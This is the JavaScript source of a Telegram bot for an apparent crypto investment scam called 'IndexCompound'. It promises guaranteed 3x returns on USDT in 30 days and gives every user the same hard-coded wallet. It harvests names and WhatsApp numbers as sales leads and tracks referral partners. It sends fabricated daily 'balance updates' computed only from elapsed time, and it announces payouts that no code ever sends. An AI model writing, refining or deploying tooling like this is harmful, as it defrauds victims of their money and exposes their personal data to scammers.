const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const LEADS_CHANNEL = process.env.LEADS_CHANNEL || "@clientlead";
const USDT_WALLET = "TRp4CmaVZJf5gN3QgqWViFfAS8751zn8DN";
const USDT_NETWORK = "TRC-20 (TRON)";

const bot = new TelegramBot(TOKEN, { polling: true });

const DB_FILE = "./investors.json";
const PARTNERS_FILE = "./partners.json";

function loadDB() {
  try { return JSON.parse(fs.readFileSync(DB_FILE, "utf8")); } catch (e) { return {}; }
}
function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
function loadPartners() {
  try { return JSON.parse(fs.readFileSync(PARTNERS_FILE, "utf8")); } catch (e) { return {}; }
}
function savePartners(p) {
  fs.writeFileSync(PARTNERS_FILE, JSON.stringify(p, null, 2));
}

const sessions = {};
function getSession(chatId) {
  if (!sessions[chatId]) sessions[chatId] = { step: "idle", data: {} };
  return sessions[chatId];
}

const PLANS = [
  { id: "starter", emoji: "🌱", name: "Starter Plan", invest: 500,   payout: 1500,  days: 30, minDeposit: 500,   maxDeposit: 999       },
  { id: "silver",  emoji: "⚡", name: "Silver Plan",  invest: 1000,  payout: 3000,  days: 30, minDeposit: 1000,  maxDeposit: 4999      },
  { id: "gold",    emoji: "🏆", name: "Gold Plan",    invest: 5000,  payout: 15000, days: 30, minDeposit: 5000,  maxDeposit: 9999      },
  { id: "vip",     emoji: "💎", name: "VIP Plan",     invest: 10000, payout: 30000, days: 30, minDeposit: 10000, maxDeposit: 999999999 },
];

function getPlan(amount) {
  return PLANS.find(function(p) { return amount >= p.minDeposit && amount <= p.maxDeposit; }) || PLANS[PLANS.length - 1];
}
function dailyProfit(plan, amount) {
  return ((plan.payout - plan.invest) / plan.invest) * amount / plan.days;
}
function fmt(n) {
  return "$" + Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}
function buildGrowthTable(amount) {
  var plan = getPlan(amount);
  var daily = dailyProfit(plan, amount);
  var table = "";
  var days = [1, 5, 10, 15, 20, 25, 30];
  for (var i = 0; i < days.length; i++) {
    var day = days[i];
    var d = String(day);
    if (d.length < 2) d = " " + d;
    table += "Day " + d + " | +" + fmt(daily * day) + " | " + fmt(amount + daily * day) + "\n";
  }
  return table;
}

const MAIN_MENU = {
  reply_markup: {
    keyboard: [
      [{ text: "💼 Investment Plans" }, { text: "🧮 Calculate Returns" }],
      [{ text: "📈 How It Works" },     { text: "❓ FAQ" }],
      [{ text: "💳 How to Buy USDT" },  { text: "🚀 Invest Now" }],
    ],
    resize_keyboard: true,
  },
};
const BACK_MENU = {
  reply_markup: { keyboard: [[{ text: "⬅️ Back to Main Menu" }]], resize_keyboard: true },
};
const HOW_IT_WORKS = "📈 *How It Works*\n\n*1️⃣ Pick a plan* — from $500 up to any amount\n*2️⃣ Buy USDT* — using PayPal, Cash App, Zelle or any exchange\n*3️⃣ Send payment* — to your assigned wallet (TRC-20)\n*4️⃣ Plan activates* — within 1-2 hours of confirmation\n*5️⃣ Daily updates* — your balance sent to you here every day\n*6️⃣ Payout* — full amount sent to your wallet on Day 30\n\n━━━━━━━━━━━━━━━━━━━\n📊 *Example — Starter Plan:*\n💵 You invest: *$500 USDT*\n📈 Daily growth: *+$33.33/day*\n• Day 10 → *$833.30*\n• Day 20 → *$1,166.60*\n• Day 30 → *$1,500.00*\n\n✅ Daily balance updates\n✅ No hidden fees\n✅ 100% guaranteed payouts";

const HOW_TO_BUY = "💳 *How to Buy USDT*\n\nNew to crypto? No problem!\n\n━━━━━━━━━━━━━━━━━━━\n*1️⃣ Coinbase (Easiest)*\n1. Download Coinbase app and sign up\n2. Link your bank or debit card\n3. Search USDT and tap Buy\n4. Go to Send, paste our wallet address\n5. Select TRON (TRC-20) as network\n\n━━━━━━━━━━━━━━━━━━━\n*2️⃣ Binance*\n1. Download Binance app and create account\n2. Tap Buy Crypto and choose payment method\n3. Buy USDT\n4. Go to Wallet, Withdraw, paste our wallet\n5. Select TRC20 network and confirm\n\n━━━━━━━━━━━━━━━━━━━\n*3️⃣ PayPal*\n1. Open PayPal app and tap Crypto\n2. Select USDT (Tether)\n3. Buy with your PayPal balance or bank\n4. Tap Transfer, External Wallet, paste our address\n⚠️ Select TRC-20 network when withdrawing\n\n━━━━━━━━━━━━━━━━━━━\n*4️⃣ Cash App*\n1. Buy Bitcoin on Cash App\n2. Transfer to Coinbase or Binance\n3. Swap to USDT and withdraw via TRC-20\n\n━━━━━━━━━━━━━━━━━━━\n*5️⃣ Zelle*\n1. Zelle money to your bank\n2. Open Coinbase or Binance\n3. Link bank, deposit USD, buy USDT\n4. Withdraw via TRC-20 to our wallet\n\n━━━━━━━━━━━━━━━━━━━\n⚠️ *ALWAYS use TRC-20 network!*\nUsing wrong network = lost funds\n\nNeed help? Contact our support team!";

const FAQ_TEXT = "❓ *Frequently Asked Questions*\n\n*Q: What is USDT?*\nA: USDT (Tether) is a digital dollar — 1 USDT = $1 USD. Stable, fast, and perfect for investments.\n\n*Q: What is TRC-20?*\nA: TRC-20 is the network USDT travels on. It is fast and has very low fees. Always select TRC-20 when sending to us.\n\n*Q: How do I get daily updates?*\nA: Once your payment is confirmed, your plan activates and this bot sends you a balance update every single day automatically.\n\n*Q: When do I receive my payout?*\nA: On Day 30 your full payout is sent to your USDT wallet.\n\n*Q: Can I invest any amount?*\nA: Yes! Minimum is $500. Any amount earns proportional daily returns.\n\n*Q: Can I reinvest after 30 days?*\nA: Yes — many clients roll profits into the next cycle.\n\n*Q: How do I prove I sent payment?*\nA: Screenshot your transfer and send it to our support team on WhatsApp.";

function getPlansMsg() {
  var msg = "💼 *Our Investment Plans*\n\n_30 days • 3x returns • USDT only_\n\n";
  for (var i = 0; i < PLANS.length; i++) {
    var p = PLANS[i];
    var daily = (p.payout - p.invest) / p.days;
    msg += p.emoji + " *" + p.name + "*\n";
    msg += "• Invest: *" + fmt(p.invest) + " USDT*\n";
    msg += "• Daily: *+" + fmt(daily) + "/day*\n";
    msg += "• Payout: *" + fmt(p.payout) + " USDT* in 30 days\n";
    msg += "• Profit: *+" + fmt(p.payout - p.invest) + "* 🚀\n\n";
  }
  msg += "_Any amount works — profits scale with your deposit._\n\nTap *🧮 Calculate Returns* to see your exact numbers!";
  return msg;
}

const LEAD_STEPS = ["name", "phone", "amount", "referral", "readiness"];
const READINESS_MAP = { 1: "Today 🔥", 2: "Within 24hrs", 3: "This week", 4: "Just exploring" };

async function sendLeadToChannel(lead) {
  var amount = parseFloat(lead.rawAmount);
  var plan = getPlan(amount);
  var daily = dailyProfit(plan, amount);
  var payout = amount + daily * 30;
  var referralLine = lead.referral && lead.referral !== "none" && lead.referral !== "skip"
    ? "\n🤝 *Referred by:* " + lead.referral
    : "\n🤝 *Referred by:* Direct (no referral)";
  var msg = "🔔 *NEW INVESTOR LEAD*\n━━━━━━━━━━━━━━━━━━━\n👤 *Name:* " + lead.name + "\n📱 *WhatsApp:* " + lead.phone + "\n💰 *Amount:* " + fmt(amount) + " USDT\n📋 *Plan:* " + plan.name + "\n📈 *Daily:* +" + fmt(daily) + "/day\n🏆 *Payout:* " + fmt(payout) + "\n⚡ *Readiness:* " + lead.readiness + referralLine + "\n🆔 *Chat ID:* `" + lead.chatId + "`\n━━━━━━━━━━━━━━━━━━━\n🪙 *Wallet:* `" + USDT_WALLET + "`\n🔗 *Network:* " + USDT_NETWORK + "\n📅 " + new Date().toUTCString();
  try {
    await bot.sendMessage(LEADS_CHANNEL, msg, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Channel error:", err.message);
  }
  if (lead.referral && lead.referral !== "none" && lead.referral !== "skip") {
    var partners = loadPartners();
    var refKey = lead.referral.toLowerCase().replace(/\s+/g, "_");
    if (!partners[refKey]) {
      partners[refKey] = { name: lead.referral, leads: 0, investors: 0, totalInvested: 0 };
    }
    partners[refKey].leads += 1;
    savePartners(partners);
  }
}

async function sendDailyUpdates() {
  var db = loadDB();
  var now = Date.now();
  for (var chatId in db) {
    var investor = db[chatId];
    if (investor.status !== "active") continue;
    var daysPassed = Math.floor((now - investor.startDate) / (1000 * 60 * 60 * 24));
    if (daysPassed > 30) {
      await bot.sendMessage(chatId, "🎉 *Congratulations, " + investor.name + "!*\n\nYour 30-day cycle is *complete!*\n\n━━━━━━━━━━━━━━━━━━━\n💵 You invested: *" + fmt(investor.amount) + "*\n🏆 Your payout: *" + fmt(investor.payout) + "*\n💸 Total profit: *+" + fmt(investor.payout - investor.amount) + "*\n━━━━━━━━━━━━━━━━━━━\n\nYour payout is being processed and will be sent within 24 hours. 🚀\n\nWould you like to reinvest? Tap *🚀 Invest Now*!", { parse_mode: "Markdown", reply_markup: MAIN_MENU.reply_markup });
      db[chatId].status = "completed";
      saveDB(db);
      continue;
    }
    if (daysPassed < 1) continue;
    var plan = getPlan(investor.amount);
    var daily = dailyProfit(plan, investor.amount);
    var balance = investor.amount + daily * daysPassed;
    var left = 30 - daysPassed;
    await bot.sendMessage(chatId, "📊 *Daily Balance Update*\n\nHi " + investor.name + "!\n\n━━━━━━━━━━━━━━━━━━━\n📅 Day *" + daysPassed + "* of 30\n💰 Current Balance: *" + fmt(balance) + "*\n📈 Today's Earnings: *+" + fmt(daily) + "*\n⏳ Days Remaining: *" + left + " days*\n🏆 Final Payout: *" + fmt(investor.payout) + "*\n━━━━━━━━━━━━━━━━━━━\n_Your money is growing every day! 🚀_", { parse_mode: "Markdown" });
  }
}

setInterval(sendDailyUpdates, 24 * 60 * 60 * 1000);
bot.onText(/\/start/, function(msg) {
  var s = getSession(msg.chat.id);
  s.step = "idle"; s.data = {};
  bot.sendMessage(msg.chat.id, "👋 *Welcome to IndexCompound!*\n\nGrow your USDT into *3x returns in just 30 days* — with daily balance updates so you watch every dollar stack up.\n\n💸 *Our Plans:*\n🌱 $500 → *$1,500* in 30 days\n⚡ $1,000 → *$3,000* in 30 days\n🏆 $5,000 → *$15,000* in 30 days\n💎 $10,000 → *$30,000* in 30 days\n\n📈 Daily updates • USDT payments • Guaranteed payouts\n\n*What would you like to do?* 👇", { parse_mode: "Markdown", reply_markup: MAIN_MENU.reply_markup });
});

bot.onText(/\/activate (\d+) (\d+\.?\d*)/, async function(msg, match) {
  var targetChatId = match[1];
  var amount = parseFloat(match[2]);
  var plan = getPlan(amount);
  var daily = dailyProfit(plan, amount);
  var payout = amount + daily * 30;
  var db = loadDB();
  var name = (db[targetChatId] && db[targetChatId].name) ? db[targetChatId].name : "Investor";
  var referral = (db[targetChatId] && db[targetChatId].referral) ? db[targetChatId].referral : null;
  db[targetChatId] = { name: name, chatId: targetChatId, amount: amount, payout: payout, planName: plan.name, referral: referral, startDate: Date.now(), status: "active" };
  saveDB(db);
  if (referral && referral !== "none" && referral !== "skip") {
    var partners = loadPartners();
    var refKey = referral.toLowerCase().replace(/\s+/g, "_");
    if (!partners[refKey]) partners[refKey] = { name: referral, leads: 0, investors: 0, totalInvested: 0 };
    partners[refKey].investors += 1;
    partners[refKey].totalInvested += amount;
    savePartners(partners);
    try {
      await bot.sendMessage(LEADS_CHANNEL, "💳 *REFERRAL CREDITED*\n━━━━━━━━━━━━━━━━━━━\n🤝 Partner: *" + referral + "*\n👤 Investor: *" + name + "*\n💰 Amount: *" + fmt(amount) + " USDT*\n📋 Plan: *" + plan.name + "*\n⚠️ Reward pending negotiation with partner", { parse_mode: "Markdown" });
    } catch(e) {}
  }
  await bot.sendMessage(targetChatId, "✅ *Payment Confirmed — Plan Activated!*\n\nWelcome aboard, " + name + "! 🎉\n\n━━━━━━━━━━━━━━━━━━━\n📋 Plan: *" + plan.name + "*\n💵 Invested: *" + fmt(amount) + " USDT*\n📈 Daily earnings: *+" + fmt(daily) + "/day*\n🏆 30-day payout: *" + fmt(payout) + " USDT*\n━━━━━━━━━━━━━━━━━━━\n\nYour balance is now growing every day! You will receive a *daily update* right here starting tomorrow. 📊\n\nSit back and watch your money grow! 💰", { parse_mode: "Markdown" });
  await bot.sendMessage(msg.chat.id, "✅ Investor " + targetChatId + " activated for " + fmt(amount));
});

bot.onText(/\/partners/, async function(msg) {
  var partners = loadPartners();
  var keys = Object.keys(partners);
  if (keys.length === 0) {
    return bot.sendMessage(msg.chat.id, "No partners yet.");
  }
  var report = "📊 *Partner Referral Report*\n━━━━━━━━━━━━━━━━━━━\n";
  for (var i = 0; i < keys.length; i++) {
    var p = partners[keys[i]];
    report += "\n🤝 *" + p.name + "*\n";
    report += "• Leads brought: *" + p.leads + "*\n";
    report += "• Confirmed investors: *" + p.investors + "*\n";
    report += "• Total invested: *" + fmt(p.totalInvested) + " USDT*\n";
  }
  report += "\n━━━━━━━━━━━━━━━━━━━\n_Reward % negotiated per partner_";
  bot.sendMessage(msg.chat.id, report, { parse_mode: "Markdown" });
});

bot.on("message", async function(msg) {
  var chatId = msg.chat.id;
  var text = msg.text ? msg.text.trim() : "";
  if (!text || text.startsWith("/")) return;
  var s = getSession(chatId);

  if (LEAD_STEPS.indexOf(s.step) !== -1) {
    var step = s.step;

    if (step === "readiness") {
      var val = parseInt(text);
      if ([1,2,3,4].indexOf(val) === -1) {
        return bot.sendMessage(chatId, "Please reply *1, 2, 3, or 4* 👇", { parse_mode: "Markdown" });
      }
      s.data.readiness = READINESS_MAP[val];
      s.data.chatId = chatId;
      s.step = "idle";
      var amount = parseFloat(s.data.rawAmount);
      var plan = getPlan(amount);
      var daily = dailyProfit(plan, amount);
      var payout = amount + daily * 30;
      var db = loadDB();
      db[chatId] = { name: s.data.name, chatId: chatId, amount: amount, payout: payout, referral: s.data.referral, status: "pending" };
      saveDB(db);
      await sendLeadToChannel(s.data);
      return bot.sendMessage(chatId, "✅ *You're Registered!*\n\nYour payment wallet has been assigned:\n\n`" + USDT_WALLET + "`\n\n🔗 *Network: " + USDT_NETWORK + "*\n💵 *Send exactly: " + fmt(amount) + " USDT*\n\n━━━━━━━━━━━━━━━━━━━\n📋 *Your Plan*\n" + plan.emoji + " *" + plan.name + "*\n• Daily earnings: *+" + fmt(daily) + "/day*\n• 30-day payout: *" + fmt(payout) + " USDT*\n━━━━━━━━━━━━━━━━━━━\n\n*Next Steps:*\n1️⃣ Buy USDT if you haven't yet (tap *💳 How to Buy USDT*)\n2️⃣ Send *exactly " + fmt(amount) + " USDT* using *TRC-20 network*\n3️⃣ Screenshot your transfer and send to our team on WhatsApp\n4️⃣ Your plan activates within *1-2 hours*\n\n📞 Our team will also reach you on *" + s.data.phone + "* shortly.\n\nOnce active, you will get *daily balance updates* right here! 📈", { parse_mode: "Markdown", reply_markup: MAIN_MENU.reply_markup });
    }

    if (step === "referral") {
      var refVal = text.toLowerCase();
      if (refVal === "no" || refVal === "none" || refVal === "skip" || refVal === "n/a") {
        s.data.referral = "none";
      } else {
        s.data.referral = text;
      }
      s.step = "readiness";
      return bot.sendMessage(chatId, "Almost done! ⚡\n\nHow soon can you send payment?\n\n1️⃣ Today!\n2️⃣ Within 24 hours\n3️⃣ This week\n4️⃣ Just checking for now\n\nReply *1, 2, 3 or 4*:", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
    }

    if (step === "amount") {
      var val = parseFloat(text.replace(/[$,]/g, ""));
      if (isNaN(val) || val < 500) {
        return bot.sendMessage(chatId, "Minimum is *$500 USDT*. Please enter a valid amount:", { parse_mode: "Markdown" });
      }
      s.data.rawAmount = val;
      s.data.amount = fmt(val);
      s.step = "referral";
      var plan = getPlan(val);
      var daily = dailyProfit(plan, val);
      var payout = val + daily * 30;
      var table = buildGrowthTable(val);
      return bot.sendMessage(chatId, "💰 *Your Investment Breakdown*\n\n" + plan.emoji + " Plan: *" + plan.name + "*\n💵 Deposit: *" + fmt(val) + " USDT*\n📈 Daily earnings: *+" + fmt(daily) + "/day*\n🏆 30-day payout: *" + fmt(payout) + " USDT*\n💸 Profit: *+" + fmt(payout - val) + " USDT*\n\n━━━━━━━━━━━━━━━━━━━\n📅 *Daily Growth Preview*\n```\n" + table + "```\n━━━━━━━━━━━━━━━━━━━\nWere you referred by someone?\n\nIf yes, type their *name or code*.\nIf no, type *SKIP*", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
    }

    s.data[step] = text;
    var nextIndex = LEAD_STEPS.indexOf(step) + 1;
    var next = LEAD_STEPS[nextIndex];
    s.step = next;
    var prompts = {
      name: "🚀 *Let's Activate Your Plan!*\n\nWhat's your *full name*?",
      phone: "Thanks " + (s.data.name || "") + "! 📱\n\nWhat's your *WhatsApp number*?",
      amount: "💰 How much would you like to invest?\n\nType any amount — e.g. *500*, *1000*, *5000*\n_Minimum: $500 USDT_",
    };
    return bot.sendMessage(chatId, prompts[next] || "", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
  }

  if (s.step === "calc") {
    var val = parseFloat(text.replace(/[$,]/g, ""));
    if (isNaN(val) || val < 1) {
      return bot.sendMessage(chatId, "Please enter a valid amount e.g. *500*", { parse_mode: "Markdown" });
    }
    s.step = "idle";
    var plan = getPlan(val);
    var daily = dailyProfit(plan, val);
    var payout = val + daily * 30;
    var full = "";
    for (var d = 1; d <= 30; d++) {
      if (d <= 5 || d % 5 === 0) {
        var dd = String(d); if (dd.length < 2) dd = " " + dd;
        full += "Day " + dd + " | Earned: +" + fmt(daily * d) + " | Balance: " + fmt(val + daily * d) + "\n";
      }
    }
    return bot.sendMessage(chatId, "🧮 *Your 30-Day Projection*\n\n💵 Deposit: *" + fmt(val) + " USDT*\n" + plan.emoji + " Plan: *" + plan.name + "*\n📈 Daily: *+" + fmt(daily) + "/day*\n\n━━━━━━━━━━━━━━━━━━━\n```\n" + full + "```\n━━━━━━━━━━━━━━━━━━━\n🏆 Payout: *" + fmt(payout) + " USDT*\n💸 Profit: *+" + fmt(payout - val) + " USDT*\n📊 Return: *" + ((payout/val-1)*100).toFixed(0) + "% in 30 days* 🚀\n\nTap *🚀 Invest Now* to get started!", { parse_mode: "Markdown", reply_markup: MAIN_MENU.reply_markup });
  }

  if (text === "⬅️ Back to Main Menu") { s.step = "idle"; return bot.sendMessage(chatId, "What would you like to do?", MAIN_MENU); }
  if (text === "💼 Investment Plans") return bot.sendMessage(chatId, getPlansMsg(), { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
  if (text === "📈 How It Works") return bot.sendMessage(chatId, HOW_IT_WORKS, { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
  if (text === "❓ FAQ") return bot.sendMessage(chatId, FAQ_TEXT, { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
  if (text === "💳 How to Buy USDT") return bot.sendMessage(chatId, HOW_TO_BUY, { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
  if (text === "🧮 Calculate Returns") {
    s.step = "calc"; s.data = {};
    return bot.sendMessage(chatId, "🧮 *Returns Calculator*\n\nHow much are you thinking of investing?\n\nType any amount — e.g. *500*, *1000*, *5000*", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
  }
  if (text === "🚀 Invest Now") {
    s.step = "name"; s.data = {};
    return bot.sendMessage(chatId, "🚀 *Let's Activate Your Plan!*\n\nWhat's your *full name*?", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
  }

  bot.sendMessage(chatId, "Use the menu below 👇", MAIN_MENU);
});

console.log("🤖 IndexCompound Bot is running...");
